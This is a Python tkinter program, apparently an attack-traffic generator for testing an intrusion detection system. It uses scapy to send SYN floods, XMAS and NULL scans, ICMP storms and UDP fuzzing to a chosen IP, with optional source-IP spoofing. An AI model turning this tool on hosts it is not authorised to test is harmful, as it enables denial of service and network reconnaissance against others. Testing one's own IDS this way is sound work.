import logging
import random
import threading
import time
import tkinter as tk
from tkinter import ttk
from tkinter.scrolledtext import ScrolledText

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import ICMP, IP, Raw, TCP, UDP, send


class RedTeamUI:
    COL_BG = "#050505"
    COL_PANEL = "#121212"
    COL_PANEL_2 = "#080808"
    COL_BORDER = "#440000"
    COL_TEXT = "#ffffff"
    COL_MUTED = "#888888"
    COL_RED = "#ff003c"
    COL_CYAN = "#00ffcc"

    FONT_UI = ("Segoe UI", 11, "bold")
    FONT_DATA = ("Consolas", 10)

    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Smart IDS - Red Team Stress Tester")
        self.root.geometry("600x550")
        self.root.configure(bg=self.COL_BG)

        self.running = False
        self.attack_thread = None

        self.target_ip = tk.StringVar(value="192.168.10.9")
        self.attack_type = tk.StringVar(value="SYN Flood")
        self.packet_count = tk.IntVar(value=50)
        self.spoof_ip = tk.BooleanVar(value=False)

        self._build_layout()

    def _build_layout(self):
        tk.Label(
            self.root,
            text="RED TEAM // ATTACK SIMULATOR",
            bg=self.COL_BG,
            fg=self.COL_RED,
            font=("Segoe UI", 16, "bold"),
        ).pack(fill=tk.X, padx=15, pady=(15, 5), anchor="w")
        tk.Frame(self.root, bg=self.COL_BORDER, height=2).pack(
            fill=tk.X, padx=15, pady=(0, 15)
        )

        control_panel = tk.Frame(
            self.root,
            bg=self.COL_PANEL,
            highlightthickness=1,
            highlightbackground=self.COL_BORDER,
        )
        control_panel.pack(fill=tk.X, padx=15, pady=5)

        row_one = tk.Frame(control_panel, bg=self.COL_PANEL)
        row_one.pack(fill=tk.X, padx=10, pady=(10, 5))
        tk.Label(
            row_one,
            text="TARGET IP:",
            bg=self.COL_PANEL,
            fg=self.COL_MUTED,
            font=self.FONT_UI,
        ).pack(side=tk.LEFT)
        tk.Entry(
            row_one,
            textvariable=self.target_ip,
            width=16,
            bg=self.COL_PANEL_2,
            fg=self.COL_RED,
            font=self.FONT_DATA,
            insertbackground=self.COL_RED,
            bd=0,
        ).pack(side=tk.LEFT, padx=10)

        tk.Label(
            row_one,
            text="PACKETS:",
            bg=self.COL_PANEL,
            fg=self.COL_MUTED,
            font=self.FONT_UI,
        ).pack(side=tk.LEFT, padx=(10, 0))
        tk.Entry(
            row_one,
            textvariable=self.packet_count,
            width=6,
            bg=self.COL_PANEL_2,
            fg=self.COL_TEXT,
            font=self.FONT_DATA,
            bd=0,
        ).pack(side=tk.LEFT, padx=10)

        row_two = tk.Frame(control_panel, bg=self.COL_PANEL)
        row_two.pack(fill=tk.X, padx=10, pady=(5, 10))
        tk.Label(
            row_two,
            text="PAYLOAD:",
            bg=self.COL_PANEL,
            fg=self.COL_MUTED,
            font=self.FONT_UI,
        ).pack(side=tk.LEFT)

        attacks = [
            "SYN Flood",
            "XMAS Scan (F,P,U)",
            "NULL Scan",
            "ICMP Ping Storm",
            "UDP Fuzzing",
        ]
        ttk.Combobox(
            row_two,
            values=attacks,
            textvariable=self.attack_type,
            state="readonly",
            width=18,
        ).pack(side=tk.LEFT, padx=10)

        tk.Checkbutton(
            row_two,
            text="Spoof Source IPs",
            variable=self.spoof_ip,
            bg=self.COL_PANEL,
            fg=self.COL_TEXT,
            selectcolor=self.COL_PANEL_2,
            activebackground=self.COL_PANEL,
            font=self.FONT_UI,
        ).pack(side=tk.LEFT, padx=10)

        button_frame = tk.Frame(self.root, bg=self.COL_BG)
        button_frame.pack(fill=tk.X, padx=15, pady=10)

        self.btn_fire = tk.Button(
            button_frame,
            text="FIRE PAYLOAD",
            bg=self.COL_RED,
            fg=self.COL_BG,
            font=self.FONT_UI,
            bd=0,
            command=self.start_attack,
            cursor="hand2",
        )
        self.btn_fire.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5), ipady=5)

        self.btn_stop = tk.Button(
            button_frame,
            text="ABORT",
            bg=self.COL_BORDER,
            fg=self.COL_MUTED,
            font=self.FONT_UI,
            bd=0,
            state=tk.DISABLED,
            command=self.stop_attack,
            cursor="hand2",
        )
        self.btn_stop.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0), ipady=5)

        tk.Label(
            self.root,
            text="ATTACK TELEMETRY",
            bg=self.COL_BG,
            fg=self.COL_MUTED,
            font=self.FONT_UI,
        ).pack(padx=15, anchor="w")
        self.log_box = ScrolledText(
            self.root,
            bg=self.COL_PANEL_2,
            fg=self.COL_TEXT,
            font=self.FONT_DATA,
            bd=0,
            highlightthickness=1,
            highlightbackground=self.COL_BORDER,
        )
        self.log_box.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))

    def log(self, message: str) -> None:
        self.log_box.insert(tk.END, f"[>] {message}\n")
        self.log_box.see(tk.END)

    def rand_ip(self) -> str:
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def _build_packet(self, attack: str, target: str, spoof: bool):
        src_ip = self.rand_ip() if spoof else None
        ip_layer = IP(dst=target, src=src_ip) if src_ip else IP(dst=target)

        if attack == "SYN Flood":
            return ip_layer / TCP(dport=80, flags="S")
        if attack == "XMAS Scan (F,P,U)":
            return ip_layer / TCP(dport=random.randint(1, 1024), flags="FPU")
        if attack == "NULL Scan":
            return ip_layer / TCP(dport=random.randint(1, 1024), flags="")
        if attack == "ICMP Ping Storm":
            return ip_layer / ICMP()
        if attack == "UDP Fuzzing":
            payload = Raw(b"X" * random.randint(16, 64))
            return ip_layer / UDP(dport=random.randint(1000, 9000)) / payload
        raise ValueError(f"Unsupported attack type: {attack}")

    def execute_attack(self):
        target = self.target_ip.get().strip()
        attack = self.attack_type.get()
        count = max(1, self.packet_count.get())
        spoof = self.spoof_ip.get()

        self.log(f"INITIATING: {attack} against {target}")

        try:
            for index in range(count):
                if not self.running:
                    break
                packet = self._build_packet(attack, target, spoof)
                send(packet, verbose=False)

                if index % 10 == 0 or index == count - 1:
                    self.log(f"Sent {index + 1}/{count} packets...")

                time.sleep(0.05)
        except Exception as exc:
            self.log(f"ERROR: {exc}")
        else:
            self.log("PAYLOAD DELIVERY COMPLETE.")
        finally:
            self.stop_attack()

    def start_attack(self):
        if self.running:
            return
        self.running = True
        self.btn_fire.config(state=tk.DISABLED, bg=self.COL_BORDER, fg=self.COL_MUTED)
        self.btn_stop.config(state=tk.NORMAL, bg=self.COL_RED, fg=self.COL_TEXT)
        self.log_box.delete("1.0", tk.END)
        self.attack_thread = threading.Thread(target=self.execute_attack, daemon=True)
        self.attack_thread.start()

    def stop_attack(self):
        self.running = False
        self.btn_fire.config(state=tk.NORMAL, bg=self.COL_RED, fg=self.COL_BG)
        self.btn_stop.config(state=tk.DISABLED, bg=self.COL_BORDER, fg=self.COL_MUTED)
        self.log("--- ATTACK HALTED ---")

    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    RedTeamUI().run()
